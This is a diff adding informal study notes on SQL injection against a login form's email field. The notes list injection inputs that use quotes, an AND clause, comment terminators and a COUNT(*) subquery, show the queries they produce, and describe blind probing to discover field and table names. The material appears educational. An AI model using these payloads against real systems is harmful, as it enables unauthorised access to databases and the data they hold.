@@ -1,0 +1,52 @@
+Introduction:
+    - TSA attack
+        - SQL injection on login
+        - sql query just string
+        - if no sanitize string string can be put in 
+        - WHERE field = '$email' 
+        - my attack WHERE field = '(my Query')';
+            - the attack:
+                ----------------------------------
+                input: 'hello'
+
+                SELECT fieldlist
+                FROM   table
+                WHERE  field = 'hello'';
+
+                "we sent your email to random.user@example.com"
+                ----------------------------------
+
+                input: anything' AND 'x
+
+                SELECT fieldlist
+                FROM   table
+                WHERE  field = 'anything' AND 'x';
+
+                "we sent your email to random.user@example.com"
+                ----------------------------------
+
+                input: 'x' AND email is NULL; --
+
+                SELECT fieldlist
+                FROM   table
+                WHERE  field = 'x' AND email is NULL; --';
+
+                "" returns nothing, we know this is a table name
+                -- allows us to create a comment so the last '; isn't read
+                ----------------------------------------------------------
+                input: x' AND 1=(SELECT COUNT(*) FROM tabname);--
+
+                SELECT fieldlist
+                FROM   table
+                WHERE  field = 'x' AND 1=(SELECT COUNT(*) FROM tabname);--';
+                
+                "" checks to see if tabname is the name of the table
+
+                ------------------------------------------------------------
+given a text input we can probe the server
+we figure out we can send information
+we figure out the names of the tabs
+we figure out the table
+write queries that probe if it returns nothing it's a valid Query
+if not we try again
+
